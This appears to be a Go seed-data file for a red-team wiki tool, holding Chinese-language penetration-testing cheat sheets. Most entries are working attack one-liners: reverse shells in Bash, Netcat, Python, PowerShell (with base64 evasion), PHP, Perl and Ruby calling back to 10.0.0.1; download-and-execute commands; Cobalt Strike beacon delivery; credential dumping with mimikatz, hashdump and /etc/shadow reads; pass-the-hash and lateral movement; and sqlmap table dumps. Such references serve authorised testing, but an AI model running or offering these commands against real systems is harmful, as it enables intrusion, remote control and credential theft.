// 红队 Wiki 内置速查数据（首次打开数据库时灌入）。
// 分类 id 与前端 mock/redteamWiki.ts 的 WIKI_CATEGORIES 一一对应。
//
// 注意：本文件用 Go 原始字符串（反引号）承载 markdown，故内容内不能出现反引号——
// 代码块统一用「4 空格缩进」表示（前端 renderMarkdown 已支持缩进代码块），
// 行内代码统一用 **粗体** 或普通文本表示。
package wiki

// BuiltinSeed 内置速查条目。
var BuiltinSeed = []SeedEntry{
	// —— 反弹 Shell ——
	{
		Category: "revshell",
		Title:    "Bash 反弹 Shell",
		Content: `## Bash TCP 反弹

    bash -i >& /dev/tcp/攻击机IP/端口 0>&1

## 常见变体

    # 显式指定 bash 路径（部分环境 /bin/sh 非 bash）
    /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

    # exec 形式（适合写入脚本）
    exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

## 注意

- 目标若为 Debian/Ubuntu 需确认存在 **/dev/tcp** 支持（bash 内建）。
- 端口建议用 53/80/443 等常见端口便于出网。`,
	},
	{
		Category: "revshell",
		Title:    "Netcat 反弹 Shell",
		Content: `## 传统 nc（-e 支持）

    nc -e /bin/sh 10.0.0.1 4444

## 无 -e 版本的 nc

    # 攻击机监听两个端口（4444 收、4445 发）
    # 目标机：
    nc 10.0.0.1 4444 | /bin/sh | nc 10.0.0.1 4445

## OpenBSD nc

    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f

> 攻击机监听：**nc -lvnp 4444**`,
	},
	{
		Category: "revshell",
		Title:    "Python 反弹 Shell",
		Content: `## Python 2/3 通用（一行）

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

## 仅 pty 版本

    python -c 'import pty,socket,os;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

> 目标为 Windows 时把 **/bin/sh** 换成 **cmd.exe**。`,
	},
	{
		Category: "revshell",
		Title:    "PowerShell 反弹 Shell",
		Content: `## PowerShell 一句话

    powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$o=$r+'PS '+(pwd).Path+'> ';$t=([text.encoding]::ASCII).GetBytes($o);$s.Write($t,0,$t.Length)}"

## 编码绕过（base64）

先把上面命令 UTF-16LE 编码为 base64，再：

    powershell -nop -enc <BASE64>`,
	},
	{
		Category: "revshell",
		Title:    "PHP / Perl / Ruby 反弹 Shell",
		Content: `## PHP

    php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

## Perl

    perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

## Ruby

    ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
	},
	{
		Category: "revshell",
		Title:    "反弹 Shell TTY 升级",
		Content: `拿到反弹 shell 后建议立即升级为全功能 TTY：

    # 1. 生成 pty
    python -c 'import pty;pty.spawn("/bin/bash")'
    # 或
    python3 -c 'import pty;pty.spawn("/bin/bash")'

    # 2. 挂起回前台（Ctrl+Z 回到攻击机）
    stty raw -echo; fg

    # 3. 目标机
    export TERM=xterm
    stty rows 50 cols 200

> 无 python 时用 **script /dev/null -c /bin/bash** 或 **stty** 手工调整。`,
	},

	// —— 下载命令 ——
	{
		Category: "download",
		Title:    "Linux 下载文件",
		Content: `## wget

    wget http://10.0.0.1/exp -O /tmp/exp

## curl

    curl http://10.0.0.1/exp -o /tmp/exp

## 无 wget/curl 时

    # 利用 /dev/tcp
    exec 3<>/dev/tcp/10.0.0.1/80
    echo -e "GET /exp HTTP/1.0\r\nHost: 10.0.0.1\r\n\r\n" >&3
    cat <&3 > /tmp/exp`,
	},
	{
		Category: "download",
		Title:    "Windows 下载文件",
		Content: `## certutil（最常用）

    certutil -urlcache -split -f http://10.0.0.1/exp.exe C:\Windows\Temp\exp.exe

## PowerShell

    powershell -nop -c "Invoke-WebRequest -Uri http://10.0.0.1/exp.exe -OutFile C:\Windows\Temp\exp.exe"
    # 或下载并执行
    powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')"

## bitsadmin

    bitsadmin /transfer n http://10.0.0.1/exp.exe C:\Windows\Temp\exp.exe

## certutil 校验 MD5（顺手做完整性检查）

    certutil -hashfile C:\Windows\Temp\exp.exe MD5`,
	},

	// —— CS 上线 ——
	{
		Category: "cs",
		Title:    "Cobalt Strike 常见上线方式",
		Content: `## PowerShell 一句话（无落地）

    powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://CS地址/a'))"

## mshta（hta 木马）

    mshta http://CS地址/a.hta

## regsvr32（sct 木马）

    regsvr32 /s /n /u /i:http://CS地址/a.sct scrobj.dll

## 生成载荷

CS 菜单：Attack → Packages → Windows Executable（或 PowerShell/HTA/SCT 等）。`,
	},
	{
		Category: "cs",
		Title:    "CS 常用操作命令",
		Content: `## Beacon 常用命令

    shell <cmd>            # 执行 cmd
    powershell <cmd>       # 执行 powershell
    upload /local/path      # 上传文件
    download <remote>       # 下载文件
    screenshot              # 截图
    keylogger               # 键盘记录
    mimikatz                # 提权/抓凭据
    hashdump                 # 导出哈希
    socks 1080               # 开启 SOCKS 代理
    portscan 10.0.0.0/24    # 内网端口扫描

## 提权 / 横向

    elevate svc-exe        # 提权
    spawn <listener>        # 派生会话
    jump psexec <target>    # 横向移动`,
	},

	// —— 红队命令 ——
	{
		Category: "commands",
		Title:    "Linux 信息收集",
		Content: `    # 系统与用户
    uname -a; cat /etc/os-release; id; whoami
    cat /etc/passwd; cat /etc/shadow 2>/dev/null

    # 网络
    ip a; route -n; cat /etc/hosts; cat /etc/resolv.conf
    ss -tulnp; netstat -tulnp

    # 进程与服务
    ps aux; systemctl list-units --type=service
    cat /etc/crontab; ls -la /etc/cron*

    # 敏感文件
    find / -name "*.conf" -o -name "*.key" -o -name "*password*" 2>/dev/null
    grep -rn "password" /etc 2>/dev/null`,
	},
	{
		Category: "commands",
		Title:    "Windows 信息收集",
		Content: `    # 系统与用户
    systeminfo; whoami /all; net user; net localgroup administrators

    # 网络
    ipconfig /all; route print; arp -a; netstat -ano

    # 进程与服务
    tasklist /svc; wmic process list brief

    # 域环境
    net view /domain; net group "domain admins" /domain`,
	},
	{
		Category: "commands",
		Title:    "Linux 提权命令",
		Content: `    # 可写文件 / SUID
    find / -writable -type f 2>/dev/null
    find / -perm -4000 -type f 2>/dev/null

    # sudo 配置
    sudo -l

    # 定时任务 / 计划任务
    cat /etc/crontab; ls -la /etc/cron.*

    # 内核版本对照漏洞
    uname -r

    # 常见的可提权服务
    systemctl list-units --type=service | grep -iE "root|db|docker"`,
	},
	{
		Category: "commands",
		Title:    "横向移动常用命令",
		Content: `## 凭据复用（内网常见）

    # psexec（Windows）
    psexec \\target -u user -p pass cmd

    # wmiexec
    wmiexec.py user:pass@target

    # smbexec
    smbexec.py user:pass@target

## 密码喷洒 / 哈希传递

    # hash 传递（impacket）
    secretsdump.py user:pass@target
    pth-winexe -U user%hash //target cmd`,
	},

	// —— 工具 Wiki ——
	{
		Category: "tools",
		Title:    "Nmap 常用命令",
		Content: `    # 端口扫描
    nmap -sS -sV -p- --min-rate 1000 -T4 <target>
    nmap -sC -sV -p 22,80,443 <target>

    # 服务/脚本
    nmap --script vuln <target>
    nmap --script smb-enum-shares -p445 <target>

    # 存活主机
    nmap -sn 10.0.0.0/24`,
	},
	{
		Category: "tools",
		Title:    "SQLMap 常用命令",
		Content: `    # 基础注入
    sqlmap -u "http://target/?id=1" --batch

    # 带 cookie / 指定参数
    sqlmap -u "http://target/?id=1" --cookie="PHPSESSID=xxx"

    # 获取数据
    sqlmap -u "http://target/?id=1" --dbs
    sqlmap -u "http://target/?id=1" -D dbname --tables
    sqlmap -u "http://target/?id=1" -D dbname -T users --dump

    # 提权辅助
    sqlmap -u "http://target/?id=1" --os-shell`,
	},
	{
		Category: "tools",
		Title:    "Nuclei 常用命令",
		Content: `    # 单目标
    nuclei -u http://target -t cves/

    # 批量 + 并发
    nuclei -l targets.txt -t cves/ -c 50 -o results.txt

    # 指定模板目录
    nuclei -u http://target -t nuclei-templates/http/

    # 输出报告
    nuclei -u http://target -t cves/ -json -o out.json`,
	},

	// —— 安全 Wiki ——
	{
		Category: "security",
		Title:    "常见 Web 漏洞速查",
		Content: `## OWASP Top 10（常见项）

- SQL 注入：参数拼接、报错/盲注/时间盲注
- 命令注入：**;id**、**|whoami**、**反引号 whoami**
- 文件上传：绕过扩展名/内容/MIME，getshell
- 文件包含：LFI/RFI
- SSRF：内网探测、读文件
- XXE：外部实体注入
- 反序列化：Java/PHP 反序列化 RCE
- 越权：IDOR、水平/垂直越权
- XSS：反射/存储/DOM
- 逻辑漏洞：验证码、支付、密码重置

## 常见测试点

    登录框：弱口令/爆破/SQL注入
    上传点：getshell
    搜索框：XSS/SQL注入
    接口：越权/信息泄露`,
	},
	{
		Category: "security",
		Title:    "渗透测试流程",
		Content: `## 标准流程

1. **信息收集**：域名/IP/子域/端口/指纹/目录
2. **漏洞探测**：Web 漏洞、服务漏洞、弱口令
3. **漏洞利用**：getshell、提权
4. **后渗透**：横向移动、凭据窃取、权限维持
5. **报告**：漏洞描述、复现步骤、修复建议

## 授权边界

- 仅在授权范围内测试
- 不触碰生产数据的完整性
- 记录全程操作日志`,
	},
}
